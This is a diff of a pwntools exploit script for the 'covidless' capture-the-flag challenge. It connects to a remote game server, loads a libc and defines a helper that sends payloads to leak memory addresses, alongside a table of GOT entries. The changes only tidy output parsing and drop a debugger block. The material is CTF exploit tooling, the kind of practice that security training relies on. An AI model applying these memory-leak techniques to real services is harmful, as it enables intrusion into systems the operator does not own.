@@ -5,10 +5,6 @@ uu64 = lambda x : u64(x.ljust(8, b'\x00'))
 
 def start(argv=[], *a, **kw):
     return remote('covidless.insomnihack.ch', 6666, *a, **kw)
-gs = '''
-init-pwndbg
-continue
-'''.format(**locals())
 
 context.clear(arch = 'amd64')
 libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
@@ -16,7 +12,7 @@ libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
 context.log_level = 'info'
 
 def get_returned_value():
-    data = io.recvline().replace(b"\ntry again ..\n\n", b"")[29:]
+    data = io.recvline()[29:].split(b',')[0]
     return data
 
 def read_address(addr):
@@ -25,8 +21,7 @@ def read_address(addr):
     io.sendline(payload)
 
     data = get_returned_value()
-    print(data)
-    return data.split(b',')[0]
+    return data
 
 globalOffsetTable = {
     'puts': 0x601018,
